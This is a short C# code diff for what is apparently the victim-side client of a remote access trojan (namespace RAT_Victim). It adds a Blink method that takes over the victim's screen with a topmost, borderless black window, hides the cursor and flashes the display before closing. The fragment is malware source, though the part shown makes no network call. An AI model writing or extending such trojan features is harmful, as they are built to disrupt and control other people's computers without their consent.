@@ -137,5 +137,37 @@ namespace RAT_Victim
                 Thread.Sleep(1);
             }
         }
+
+        public static void Blink()
+        {
+            var form = new Form
+            {
+                FormBorderStyle = FormBorderStyle.None,
+                WindowState = FormWindowState.Maximized,
+                BackColor = Color.Black,
+                TopMost = true,
+                ShowInTaskbar = false
+            };
+            form.Load += (sender, eventArgs) =>
+            {
+                const int interval = 25;
+                Cursor.Hide();
+
+                new Thread(() =>
+                {
+                    for (var i = 0; i < 5; i++)
+                    {
+                        form.Invoke((Action)(() => form.Opacity = 0.01));
+                        Thread.Sleep(interval);
+
+                        form.Invoke((Action)(() => form.Opacity = 1));
+                        Thread.Sleep(interval);
+                    }
+
+                    form.Invoke((Action)form.Close);
+                }).Start();
+            };
+            Application.Run(form);
+        }
     }
 }
